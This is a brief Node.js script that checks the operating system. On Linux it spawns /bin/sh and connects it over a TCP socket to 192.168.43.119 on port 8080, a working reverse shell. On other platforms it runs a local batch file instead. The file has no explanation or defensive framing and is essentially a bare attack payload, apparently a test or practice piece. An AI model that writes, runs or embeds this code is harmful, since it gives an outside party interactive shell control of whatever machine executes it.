var os = require("os");
var hook = os.platform();

if (hook === "linux") {
  (function () {
    var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.43.119", function () {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
    });
    return /a/;
  })();
} else {
  require("child_process").exec(
    "/home/souvik/Desktop/test/win.bat/",
    function (err, stdout, stderr) {
      if (err) {
        return console.log(err);
      }
      console.log(stdout);
    }
  );
}
